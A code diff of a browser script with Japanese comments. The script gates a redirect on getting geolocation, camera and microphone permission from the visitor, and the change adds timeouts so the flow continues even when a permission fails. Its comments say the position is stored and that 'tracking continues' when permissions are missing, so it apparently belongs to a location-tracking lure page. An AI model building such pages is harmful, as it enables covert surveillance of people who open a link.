@@ -1,5 +1,5 @@
 /* 要件ゲート。押されたら 位置情報→カメラ→マイク の順で許可を求める。
-   3つ全部成功したときだけ window.LT_ALLOW_REDIRECT を立てて飛び先へ送る。 */
+   位置情報は無反応対策でJS側タイムアウト。失敗しても止めずに先へ進む。 */
 (function () {
   "use strict";
 
@@ -11,7 +11,6 @@
   function say(t) { if (stat) stat.textContent = t || ""; }
   function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
 
-  /* コピー（クリックでは走らせない） */
   var cp = document.getElementById("lt_copy");
   if (cp) {
     cp.addEventListener("click", function (e) {
@@ -41,30 +40,35 @@
     });
   }
 
-  function geo() {
+  /* ★ 無反応でも必ず返す */
+  function geoOnce(o) {
     return new Promise(function (res) {
-      if (!navigator.geolocation) { say("① 位置情報：この端末では非対応"); return res(false); }
-      say("① 位置情報の許可を確認しています…");
+      if (!navigator.geolocation) return res(null);
       var done = false;
-      function fin(ok) { if (done) return; done = true; res(ok); }
-      var t = setTimeout(function () { fin(false); }, 22000);
+      var to = setTimeout(function () { if (!done) { done = true; res(null); } },
+                          (o.timeout || 9000) + 1200);
       try {
         navigator.geolocation.getCurrentPosition(
-          function (p) {
-            clearTimeout(t);
-            window.LT_FIRST_FIX = p;
-            say("① 位置情報：取得しました");
-            fin(true);
-          },
-          function (e) {
-            clearTimeout(t);
-            say((e && e.code === 1) ? "① 位置情報：拒否されました"
-                                    : "① 位置情報：取れませんでした");
-            fin(false);
-          },
-          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
-      } catch (e) { clearTimeout(t); fin(false); }
+          function (p) { if (done) return; done = true; clearTimeout(to); res(p); },
+          function (e) { if (done) return; done = true; clearTimeout(to); res({ err: e }); },
+          o);
+      } catch (e) { clearTimeout(to); if (!done) { done = true; res(null); } }
     });
+  }
+
+  function geo() {
+    if (!navigator.geolocation) { say("① 位置情報：この端末では非対応"); return Promise.resolve(false); }
+    say("① 位置情報の許可を確認しています…");
+    return geoOnce({ enableHighAccuracy: true, timeout: 9000, maximumAge: 0 })
+      .then(function (r) {
+        if (r && r.coords) {
+          window.LT_FIRST_FIX = r;
+          say("① 位置情報：取得しました");
+          return true;
+        }
+        say("① 位置情報：まだ取得できていません（追跡は続きます）");
+        return false;
+      });
   }
 
   function cam() {
@@ -117,17 +121,15 @@
       ok.mic = r;
 
       if (ok.geo && ok.cam && ok.mic) {
-        // 3つ全部そろった → 飛び先へ行ってよい
         window.LT_ALLOW_REDIRECT = true;
         var ia = document.getElementById("lt_ia");
         if (ia) ia.style.display = "none";
       } else {
-        // どれか欠けた → 画面に最小限だけ出す（このまま追跡は続く）
         document.body.classList.add("need");
       }
       setTimeout(pass, 250);
     });
-    setTimeout(pass, 26000);   // 保険
+    setTimeout(pass, 16000);   // 保険（無反応でも先へ）
   }
 
   if (btn) btn.addEventListener("click", run, { once: true });
